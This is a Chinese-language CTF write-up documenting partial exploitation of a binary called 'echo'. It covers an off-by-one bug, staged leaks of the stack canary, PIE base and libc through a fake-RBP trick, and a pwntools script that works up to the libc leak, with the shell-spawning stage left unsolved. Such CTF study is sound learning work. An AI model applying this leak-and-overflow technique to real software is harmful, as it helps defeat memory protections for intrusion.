# CTF Pwn: `echo` — 解題進度整理

## 二進位保護

| 保護 | 狀態 | 影響 |
|------|------|------|
| Full RELRO | ✅ | GOT 完全唯讀，任何寫入 → SIGSEGV |
| Canary | ✅ | Stack overflow 會被偵測 |
| NX | ✅ | Stack 不可執行 |
| PIE | ✅ | 程式載入位址隨機化 |
| SHSTK/IBT | ✅ | Intel CET 保護 |
| Stripped | ❌ | 有 symbol |

---

## 漏洞：Off-by-One in `read_stdin()`

### 行為分析

```
local_18 = N（讀取上限）
read_stdin 每次讀 1 byte：
  1. 讀入 byte
  2. 如果是 \n → 填 \x00，停止
  3. counter++
  4. if local_18 >= counter → 繼續，否則停止（不填 \x00）
```

**關鍵：** `local_18 = N` 時，需要送第 **N+2** 個 byte 才觸發自然停止
- N+1 個 byte 被讀入（counter = N+1）
- 第 N+2 個 byte 觸發 check `N >= N+1 = false`，停止

### Stack 佈局（echo frame，從 buffer 開頭算 offset）

```
Offset  欄位              大小
0~63    buffer            64 bytes
64      local_18          1 byte   ← off-by-one 覆蓋點
65~71   padding           7 bytes
72~79   canary            8 bytes  ← canary[0] 固定為 \x00
80~87   saved RBP         8 bytes  ← [6,7] 通常為 \x00
88~95   return address    8 bytes  ← [6,7] 固定為 \x00
```

---

## 已確認的地址 (PIE Offset)

```
PIE_OFFSET       = 0x1342   (main+89，return address 固定低 12 bits = 0x342)
puts@GOT offset  = 0x3fa8
echo_69 offset   = 0x12c3   (lea rax,[rbp-0x50]; mov rdi,rax; call puts; jmp loop)
ret gadget       = 0x101a   (for stack alignment)
```

### GOT 佈局（重要！）

```
puts_got + 0x00 = puts        (libc addr)
puts_got + 0x08 = __stack_chk_fail
puts_got + 0x10 = setbuf
puts_got + 0x18 = printf
puts_got + 0x20 = memset
puts_got + 0x28 = read
puts_got + 0x30 = __libc_start_main
puts_got + 0x38 = 0 (ITM_deregister)
puts_got + 0x40 = 0 (_gmon_start__)     ← local_18 = 0！
puts_got + 0x48 = 0 (ITM_register)
puts_got + 0x50 = __cxa_finalize        (libc addr)
puts_got + 0x58 = 0 (data_start)
```

**關鍵發現：`puts_got + 0x40 = 0`！**

---

## 各 Round 的作用（已穩定運作）

### Round 1：Off-by-One，local_18 → 0x80
```python
send(b'A' * 64 + p8(0x80))   # 65 bytes，自然停止
```
puts 印出 padding 的 stack 垃圾值（到遇到 \x00 停止）。

### Round 2：填滿 padding 為非零
```python
send(b'B' * 64 + p8(0x48) + b'\x41' * 7 + b'\n')
```
確保後續 puts 能印過 padding。

### Round 3：local_18 → 0x58，Leak canary + saved_rbp
```python
send(b'C' * 64 + p8(0x58) + b'\x41' * 7 + p8(0x01))
# local_18=0x80 → off-by-one: 129 bytes 上限
# canary[0] 被覆蓋成 \x01，puts 能印過 canary
# 印到 saved_rbp[5]，遇到 saved_rbp[6]=\x00 停止
```
成功 leak: `canary`（7 bytes + 補 \x00）、`saved_rbp`（6 bytes + 補 \x00\x00）。

**失敗條件（需 retry）：**
- canary 或 saved_rbp 的有效部分含有 `\x0a`（\n）

### Round 4：Leak return address（ret_addr）
```python
r4_payload = b'D'*64 + p8(0x58) + b'\x41'*7 + canary_send + saved_rbp[:6] + b'\x01\x01'
send(r4_payload + b'Z')   # 89 bytes 總共
# local_18=0x58 → 自然停止於第 89 byte
# saved_rbp[6,7] → \x01，puts 能印過 saved_rbp
# 印到 ret_addr[5]，遇到 ret_addr[6]=\x00 停止
```
puts 印出 ret_addr[0:6]，但 ret_addr[0] 被 'Z'(=0x5a) 覆蓋。

**還原 ret_addr[0]：**
```python
ret_addr_bytes = bytearray(raw_output[88:94])
ret_addr_bytes[0] = PIE_OFFSET & 0xff   # = 0x42
ret_addr = u64(bytes(ret_addr_bytes) + b'\x00\x00')
pie_base = ret_addr - PIE_OFFSET
```

**失敗條件（需 retry）：**
- ret_addr[1:6] 含有 `\x00`（中途被 puts 截斷）

### Round 5：擴大 local_18 → 0xc0
```python
send(b'F'*64 + p8(0xc0) + b'G'*24)   # 89 bytes，local_18=0x58 → 自然停止
```
讓後續 overflow 可以送 193 bytes。

---

## Stage 1：Leak libc（已成功）

### 策略：Fake RBP Trick

`echo_69` 的指令：`lea rax,[rbp-0x50]; mov rdi,rax; call puts`

令 `fake_rbp = puts_got + 0x50`，則 `rbp - 0x50 = puts_got`，`rdi = puts_got`，`puts(puts_got)` 印出 puts 的 libc 位址。

```python
fake_rbp = puts_got + 0x50
overflow1 = b'\x00' + b'\x41'*71    # buffer[0]=\x00，while breaks
overflow1 += canary                  # offset 72
overflow1 += p64(fake_rbp)          # offset 80
overflow1 += p64(echo_69)           # offset 88
overflow1 = overflow1.ljust(193, b'\x41')
```

成功 leak 到 `puts` 的 libc 位址，計算出 libc base。

---

## 核心難點：Stage 2 死局

### 問題描述

Stage 1 執行後，echo 繼續在迴圈中：
- echo 的 **rbp = puts_got + 0x50**（fake_rbp）
- buffer 起點 = `rbp - 0x50` = **puts_got**（GOT 區域）
- local_18 = `[rbp - 0x10]` = `[puts_got + 0x40]` = **0**（已確認）

### Stage 2 的所有嘗試

| 嘗試 | 結果 | 原因 |
|------|------|------|
| 直接送 overflow2 | SIGSEGV at `read_stdin+91` | read 嘗試寫 `\x00` 到 puts@GOT（RELRO）|
| 送 `\n` | SIGSEGV | `\n` → `\x00` 寫到 puts@GOT |
| local_18=0，送 1 byte | SIGSEGV | read_stdin 的第一個 byte 就寫到 puts_got |
| fake_rbp 改成 stack 位址 | puts 印出 buffer 內容，不是 libc 位址 | rdi = buffer 位址，不是 puts_got |

### 根本矛盾

```
Leak libc 需要：fake_rbp = puts_got + 0x50
  → 讓 echo_69 執行 puts(puts_got) → 印出 libc 位址

Stage 2 需要：buffer 在 stack 上（不在 GOT）
  → 需要 rbp 指向 stack

兩者不能同時滿足（除非有第三種方法）
```

### 為什麼不能改 fake_rbp 到 stack？

若 `fake_rbp = saved_rbp - 0x20`（stack 上）：
- `rdi = fake_rbp - 0x50 = saved_rbp - 0x70`
- 這是 **buffer 的起點位址**（一個 stack 指標）
- `puts(buffer_start)` 印出 buffer 的**內容**，不是 libc 位址

---

## 已知的關鍵資訊

### GOT 的 `puts_got + 0x50` = `__cxa_finalize`（libc 位址！）

```
puts_got + 0x50 = 0x7f28b89df9a0 (__cxa_finalize)
```

### 潛在突破：`__libc_start_main` 在 `puts_got + 0x30`

若 fake_rbp = `puts_got + 0x80`，則：
- `rbp - 0x50 = puts_got + 0x30` = `__libc_start_main@GOT`
- `puts(puts_got+0x30)` 印出 `__libc_start_main` 的 libc 位址
- 效果等同於 puts_got，但不影響 Stage 2（GOT 問題一樣）

---

## 待探索的方向

### 方向 A：Stage 1 直接 getshell，不需要 Stage 2

在 overflow1 裡放完整 ROP chain（leak + system），但需要先知道 libc。
- 問題：Stage 1 之前不知道 libc，雞生蛋

### 方向 B：利用 `echo_69` 後的 `jmp loop`，在迴圈中取得控制

Stage 1 leak 後，echo 回到迴圈，此時：
- local_18 = 0（puts_got+0x40 = 0）
- 每次 read 1 byte，off-by-one 停止，不寫 \x00
- buffer[0] 的值 = puts_got[0]（libc 位址的最低 byte，非零）
- while 繼續

**每次送 1 byte，因為 RELRO 寫不到 buffer（puts_got）...** 但實際上 read_stdin 是寫到 `[buffer + counter]`，counter=0 時寫到 puts_got[0]，仍然 SIGSEGV。

### 方向 C：SROP（Sigreturn-Oriented Programming）

需要 `syscall; ret` gadget，已確認 binary 和 libc 都沒有。

### 方向 D：ret2dl-resolve

不需要 libc base，直接讓 dynamic linker 解析 `system`。
- 複雜，需要構造 fake link map
- 理論上可行，但需要大量研究

### 方向 E：`__cxa_finalize` 利用

`puts_got + 0x50 = __cxa_finalize`（libc 位址）。
如果 fake_rbp = `puts_got + 0xa0`：
- `rbp - 0x50 = puts_got + 0x50` = `__cxa_finalize@GOT`
- puts 印出 `__cxa_finalize` 的 libc 位址（另一種 leak 方式，結果相同）

### 方向 F：Stage 1 後 return to main

讓 echo 在 leak 後 return 到 main，main 再呼叫 echo，echo 有全新 stack frame。

問題：`echo_69` 後面是 `jmp loop`，不是 `ret`，無法串接 ROP。
但 `call puts` 時 rsp = `echo_real_rbp + 16`（overflow offset 96），
如果能讓 puts return 到 main 而不是 `jmp loop`...

**`call puts` 把 `jmp loop` 的位址 push 到 `[echo_real_rbp + 8]`（overflow offset 88），覆蓋了我們原本放的 `echo_69`。** 這個行為不可控。

### 方向 G：One Gadget（最有希望）

找 libc 裡的 one_gadget：不需要 pop rdi，直接 execve("/bin/sh")。
限制：需要 libc base（已知），且需要 constraints 滿足。

**問題仍是：如何在知道 libc base 後執行 one_gadget？** 需要第二次 overflow，但 Stage 2 無法執行。

---

## 目前腳本（已能穩定執行到 leak libc）

```python
from pwn import *

PIE_OFFSET = 0x1342

def exploit():
    while True:
        p = process('./echo')
        context.arch = 'amd64'
        elf  = ELF('./echo', checksec=False)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

        def send_and_recv(payload):
            p.send(payload)
            return p.recvuntil(b'echo ')[:-5]

        p.recvuntil(b'echo ')

        # R1: off-by-one
        send_and_recv(b'A' * 64 + p8(0x80))
        # R2: fill padding
        send_and_recv(b'B' * 64 + p8(0x48) + b'\x41' * 7 + b'\n')
        # R3: leak canary + saved_rbp
        r3 = send_and_recv(b'C' * 64 + p8(0x58) + b'\x41' * 7 + p8(0x01)).rstrip(b'\n')
        if len(r3) < 86: p.close(); continue

        canary    = u64(b'\x00' + r3[73:80])
        saved_rbp = u64(r3[80:86] + b'\x00\x00')
        canary_send = p8(0x01) + canary.to_bytes(8,'little')[1:]
        if b'\x0a' in canary_send or b'\x0a' in saved_rbp.to_bytes(8,'little')[:6]:
            p.close(); continue

        # R4: leak ret_addr
        r4_payload = b'D'*64 + p8(0x58) + b'\x41'*7 + canary_send + saved_rbp.to_bytes(8,'little')[:6] + b'\x01\x01'
        p.send(r4_payload + b'Z')
        raw = p.recvuntil(b'echo ')
        if len(raw) < 94: p.close(); continue
        ret_bytes = bytearray(raw[88:94])
        ret_bytes[0] = PIE_OFFSET & 0xff
        pie_base = u64(bytes(ret_bytes) + b'\x00\x00') - PIE_OFFSET
        if pie_base & 0xfff: p.close(); continue

        # R5: expand local_18 to 0xc0
        p.send(b'F'*64 + p8(0xc0) + b'G'*24)
        p.recvuntil(b'echo ')

        # Stage 1: leak libc
        puts_got = pie_base + 0x3fa8
        echo_69  = pie_base + 0x12c3
        fake_rbp = puts_got + 0x50

        overflow1  = b'\x00' + b'\x41'*71
        overflow1 += canary.to_bytes(8,'little')
        overflow1 += p64(fake_rbp)
        overflow1 += p64(echo_69)
        overflow1  = overflow1.ljust(193, b'\x41')
        p.send(overflow1)

        leak = p.recvline()
        while len(leak.strip()) > 8: leak = p.recvline()
        puts_leak = u64(leak.strip().ljust(8, b'\x00'))
        if not (0x7f0000000000 < puts_leak < 0x7fffffff0000):
            p.close(); continue

        libc.address = puts_leak - libc.sym['puts']
        print(f"[+] libc base: {hex(libc.address)}")

        # ===== Stage 2: ??? (卡住) =====
        p.interactive()
        break

exploit()
```

---

## 問題總結

| 問題 | 狀態 |
|------|------|
| off-by-one 觸發 | ✅ 穩定 |
| canary leak | ✅ 穩定 |
| saved_rbp leak | ✅ 穩定 |
| ret_addr / PIE leak | ✅ 穩定 |
| libc leak | ✅ 穩定 |
| Stage 2 getshell | ❌ 卡住 |

**核心障礙：** leak libc 後，echo 的 buffer 指向 GOT（RELRO 唯讀），無法進行第二次 overflow。需要找到一種方法讓 echo 回到可控的 stack frame，或在 Stage 1 一次性完成 getshell。